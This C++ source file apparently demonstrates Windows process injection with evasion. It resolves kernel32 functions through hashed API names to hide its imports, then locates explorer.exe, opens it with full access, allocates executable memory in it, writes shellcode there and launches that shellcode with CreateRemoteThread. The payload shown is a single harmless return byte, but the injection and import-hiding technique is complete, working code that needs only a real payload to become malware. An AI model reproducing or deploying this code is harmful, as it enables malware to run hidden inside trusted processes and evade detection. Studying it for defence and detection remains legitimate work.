#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#include "../shared/get_proc_address.h"
using namespace std;

PVOID GetKernel32();

using GetProcAddress_t = FARPROC (WINAPI*)(HMODULE hModule,LPCSTR lpProcName);
using VirtualAllocEx_t = LPVOID (WINAPI*)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);
using OpenProcess_t = HANDLE (WINAPI*)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);
using WriteProcessMemory_t = 
BOOL (WINAPI*)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
);
using CreateRemoteThread_t = 
HANDLE (WINAPI*)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);
using CreateToolhelp32Snapshot_t = HANDLE (WINAPI*)(
    DWORD dwFlags,
    DWORD th32ProcessID
);
using Process32FirstW_t = BOOL (WINAPI*)(
    HANDLE            hSnapshot,
    LPPROCESSENTRY32W lppe
);
using Process32NextW_t = BOOL (WINAPI*)(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32W lppe
);

size_t VirtualAllocEx_hash = 12841078271711393660;      
size_t OpenProcess_hash = 363983298000572854;
size_t WriteProcessMemory_hash = 6222444897683548874;
size_t CreateToolhelp32Snapshot_hash = 3366718151655856405;
size_t CreateRemoteThread_hash = 7505753960777937923;
size_t Process32FirstW_hash = 15703051190420989384;
size_t Process32NextW_hash = 9868886670714350879;

char shellcode[1] = { 0xC3 };
CreateToolhelp32Snapshot_t pfnCreateToolhelp32Snapshot;
Process32FirstW_t pfnProcess32FirstW;
Process32NextW_t pfnProcess32NextW;
DWORD FindPidByName();

int main()
{
    PVOID K32Base = GetKernel32();
    cout << hex << K32Base << endl;
    
    //cout << hex << get_proc_address((HMODULE)K32Base, "VirtualAllocEx") << endl;
    VirtualAllocEx_t pfnVirtualAllocEx = (VirtualAllocEx_t)get_proc_address((HMODULE)K32Base, VirtualAllocEx_hash);
    OpenProcess_t pfnOpenProcess = (OpenProcess_t)get_proc_address((HMODULE)K32Base, OpenProcess_hash);
    WriteProcessMemory_t pfnWirteProcessMemory = (WriteProcessMemory_t)get_proc_address((HMODULE)K32Base, WriteProcessMemory_hash);
    CreateRemoteThread_t pfnCreateRemoteThread = (CreateRemoteThread_t)get_proc_address((HMODULE)K32Base, CreateRemoteThread_hash);
    pfnCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)get_proc_address((HMODULE)K32Base, CreateToolhelp32Snapshot_hash);
    pfnProcess32FirstW = (Process32FirstW_t)get_proc_address((HMODULE)K32Base, Process32FirstW_hash);
    pfnProcess32NextW = (Process32NextW_t)get_proc_address((HMODULE)K32Base, Process32NextW_hash);


    HANDLE handle = pfnOpenProcess(PROCESS_ALL_ACCESS, 0, FindPidByName());
    PVOID baseshelcode = pfnVirtualAllocEx(handle, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    size_t r;
    pfnWirteProcessMemory(handle, baseshelcode, shellcode, 1, &r);
    pfnCreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)baseshelcode, NULL, NULL, NULL);
    

    return 0;
}





DWORD FindPidByName()
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);
    HANDLE hProcessSnap = pfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return -1 ;
    }
    BOOL bMore = pfnProcess32FirstW(hProcessSnap, &pe32);
    while (bMore)
    {
        if (!_wcsicmp(pe32.szExeFile, L"explorer.exe"))
        {
            return pe32.th32ProcessID;
        }
        bMore = pfnProcess32NextW(hProcessSnap, &pe32);
    }
    ::CloseHandle(hProcessSnap);

    return -1; //-1
}